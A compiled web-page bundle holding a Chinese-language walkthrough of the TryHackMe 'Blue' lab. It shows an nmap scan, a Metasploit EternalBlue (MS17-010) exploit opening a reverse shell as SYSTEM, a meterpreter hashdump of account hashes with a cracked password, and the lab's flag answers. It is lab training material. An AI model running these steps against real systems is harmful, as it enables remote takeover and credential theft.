"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4802],{40173:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>i,metadata:()=>r,toc:()=>d});var t=s(74848),o=s(28453);const i={sidebar_position:1,tags:["Easy","Windows","CVE-2017-0146"],title:"Blue",description:"Windows \u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u4ecb\u7ecd"},a="Blue",r={id:"box/TryHackMe/Blue",title:"Blue",description:"Windows \u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u4ecb\u7ecd",source:"@site/docs/box/TryHackMe/Blue.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/Blue",permalink:"/docs/box/TryHackMe/Blue",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"CVE-2017-0146",permalink:"/docs/tags/cve-2017-0146"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["Easy","Windows","CVE-2017-0146"],title:"Blue",description:"Windows \u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u4ecb\u7ecd"},sidebar:"boxSidebar",previous:{title:"TryHackMe",permalink:"/docs/category/tryhackme"},next:{title:"Bypass Disable Functions",permalink:"/docs/box/TryHackMe/Bypass Disable Functions"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"ms17-010",id:"ms17-010",level:2},{value:"Flag",id:"flag",level:2},{value:"Task1",id:"task1",level:3},{value:"Task2",id:"task2",level:3},{value:"Task3",id:"task3",level:3},{value:"Task4",id:"task4",level:3},{value:"Task5",id:"task5",level:3}];function c(e){const n={blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"blue",children:"Blue"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u56e0\u4e3a Windows \u9632\u706b\u5899\u9ed8\u8ba4\u4e0d\u56de\u663e ICMP \u8bf7\u6c42\u6240\u4ee5\u9700\u8981\u4f7f\u7528 -Pn \u9009\u9879"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-158-144:~# nmap -sT -p- --min-rate 1000 -Pn  10.10.75.105\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-01 11:16 BST\nNmap scan report for ip-10-10-75-105.eu-west-1.compute.internal (10.10.75.105)\nHost is up (0.0032s latency).\nNot shown: 65526 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49158/tcp open  unknown\n49160/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 38.76 seconds\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ms17-010",children:"ms17-010"}),"\n",(0,t.jsx)(n.p,{children:"\u76f4\u63a5\u4f7f\u7528 MSF \u8fdb\u884c\u653b\u51fb\u5c31\u53ef\u4ee5\u4e86, \u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u90fd\u662f\u8001\u6f0f\u6d1e\u4e86, \u914d\u7f6e\u5b8c\u6210\u4e4b\u540e\u76f4\u63a5\u8fd0\u884c\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:"showLineNumbers",children:"msf6 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                      Disclosure Date  Rank     Check  Description\n   -  ----                                      ---------------  ----     -----  -----------\n   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection\n   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf6 > use 0\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.75.105\nRHOSTS => 10.10.75.105\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp\npayload => windows/x64/shell/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS         10.10.75.105     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded\n                                             Standard 7 target machines.\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Stan\n                                             dard 7 target machines.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar\n                                             get machines.\n\n\nPayload options (windows/x64/shell/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.158.144    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n\n[*] Started reverse TCP handler on 10.10.158.144:4444 \n[*] 10.10.75.105:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.75.105:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.75.105:445      - Scanned 1 of 1 hosts (100% complete)\n[+] 10.10.75.105:445 - The target is vulnerable.\n[*] 10.10.75.105:445 - Connecting to target for exploitation.\n[+] 10.10.75.105:445 - Connection established for exploitation.\n[+] 10.10.75.105:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.75.105:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.75.105:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.75.105:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.75.105:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.75.105:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.75.105:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.75.105:445 - Sending all but last fragment of exploit packet\n[*] 10.10.75.105:445 - Starting non-paged pool grooming\n[+] 10.10.75.105:445 - Sending SMBv2 buffers\n[+] 10.10.75.105:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.75.105:445 - Sending final SMBv2 buffers.\n[*] 10.10.75.105:445 - Sending last fragment of exploit packet!\n[*] 10.10.75.105:445 - Receiving response from exploit packet\n[+] 10.10.75.105:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.75.105:445 - Sending egg to corrupted connection.\n[*] 10.10.75.105:445 - Triggering free of corrupted buffer.\n[*] Sending stage (336 bytes) to 10.10.75.105\n[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.75.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[*] Command shell session 1 opened (10.10.158.144:4444 -> 10.10.75.105:49197) at 2023-08-01 11:24:37 +0100\n\n\nShell Banner:\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n-----\n          \n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag",children:"Flag"}),"\n",(0,t.jsx)(n.h3,{id:"task1",children:"Task1"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["How many ports are open with a port number under 1000? ",(0,t.jsx)(n.code,{children:"3"})]}),"\n",(0,t.jsxs)(n.li,{children:["What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) ",(0,t.jsx)(n.code,{children:"Ms17-010"})]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"task2",children:"Task2"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)  ",(0,t.jsx)(n.code,{children:"exploit/windows/smb/ms17_010_eternalblue"})]}),"\n",(0,t.jsxs)(n.li,{children:["Show options and set the one required value. What is the name of this value? (All caps for submission)  ",(0,t.jsx)(n.code,{children:"RHOSTS"})]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"task3",children:"Task3"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)  ",(0,t.jsx)(n.code,{children:"post/multi/manage/shell_to_meterpreter"})]}),"\n",(0,t.jsxs)(n.li,{children:["Select this (use MODULE_PATH). Show options, what option are we required to change? ",(0,t.jsx)(n.code,{children:"SESSION"})]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"task4",children:"Task4"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# \u4fdd\u5b58\u5f53\u524d\u4f1a\u8bdd\nmsf6 post(windows/gather/smart_hashdump) > use post/multi/manage/shell_to_meterpreter\nmsf6 post(multi/manage/shell_to_meterpreter) > options\n\nModule options (post/multi/manage/shell_to_meterpreter):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection\n   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).\n   LPORT    4433             yes       Port for payload to connect to.\n   SESSION                   yes       The session to run this module on\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1\nSESSION => 1\nmsf6 post(multi/manage/shell_to_meterpreter) > run\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                                                Connection\n  --  ----  ----                     -----------                                                                ----------\n  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Mic  10.10.158.144:4444 -> 10.10.75.105:49197 (10.10.75.105)\n                                     ros...\n  2         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC                                               10.10.158.144:4433 -> 10.10.75.105:49217 (10.10.75.105)\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 2\n[*] Starting interaction with 2...\n\nmeterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? ",(0,t.jsx)(n.code,{children:"Jon"})]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["Copy this password hash to a file and research how to crack it. What is the cracked password? ",(0,t.jsx)(n.code,{children:"alqfna22"})]}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"task5",children:"Task5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"C:\\>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\\n\n03/17/2019  02:27 PM                24 flag1.txt\n07/13/2009  10:20 PM    <DIR>          PerfLogs\n04/12/2011  03:28 AM    <DIR>          Program Files\n03/17/2019  05:28 PM    <DIR>          Program Files (x86)\n12/12/2018  10:13 PM    <DIR>          Users\n03/17/2019  05:36 PM    <DIR>          Windows\n               1 File(s)             24 bytes\n               5 Dir(s)  20,439,040,000 bytes free\n\nC:\\>type flag1.txt\ntype flag1.txt\nflag{access_the_machine}\n\nC:\\Windows\\System32\\config>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Windows\\System32\\config\n\n08/01/2023  05:03 AM    <DIR>          .\n08/01/2023  05:03 AM    <DIR>          ..\n12/12/2018  06:00 PM            28,672 BCD-Template\n08/01/2023  05:12 AM        18,087,936 COMPONENTS\n08/01/2023  05:32 AM           262,144 DEFAULT\n03/17/2019  02:32 PM                34 flag2.txt\n07/13/2009  09:34 PM    <DIR>          Journal\n08/01/2023  05:32 AM    <DIR>          RegBack\n03/17/2019  03:05 PM           262,144 SAM\n08/01/2023  05:13 AM           262,144 SECURITY\n08/01/2023  05:39 AM        40,632,320 SOFTWARE\n08/01/2023  05:47 AM        12,582,912 SYSTEM\n11/20/2010  09:41 PM    <DIR>          systemprofile\n12/12/2018  06:03 PM    <DIR>          TxR\n               8 File(s)     72,118,306 bytes\n               6 Dir(s)  20,439,040,000 bytes free\n\nC:\\Windows\\System32\\config>type flag2.txt\ntype flag2.txt\nflag{sam_database_elevated_access}\n\nC:\\Users\\Jon\\Documents>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Users\\Jon\\Documents\n\n12/12/2018  10:49 PM    <DIR>          .\n12/12/2018  10:49 PM    <DIR>          ..\n03/17/2019  02:26 PM                37 flag3.txt\n               1 File(s)             37 bytes\n               2 Dir(s)  20,439,040,000 bytes free\n\nC:\\Users\\Jon\\Documents>type flag3.txt\ntype flag3.txt\nflag{admin_documents_can_be_valuable}\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["Flag1?\xa0",(0,t.jsx)(n.em,{children:"This flag can be found at the system root."})," ",(0,t.jsx)(n.code,{children:"flag{access_the_machine}"})]}),"\n",(0,t.jsxs)(n.li,{children:["Flag2?\xa0",(0,t.jsx)(n.em,{children:"This flag can be found at the location where passwords are stored within Windows."})," ",(0,t.jsx)(n.code,{children:"flag{sam_database_elevated_access}"})]}),"\n",(0,t.jsxs)(n.li,{children:["flag3?\xa0",(0,t.jsx)(n.em,{children:"This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved."})," ",(0,t.jsx)(n.code,{children:"flag{admin_documents_can_be_valuable}"})]}),"\n"]})]})}function m(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>r});var t=s(96540);const o={},i=t.createContext(o);function a(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);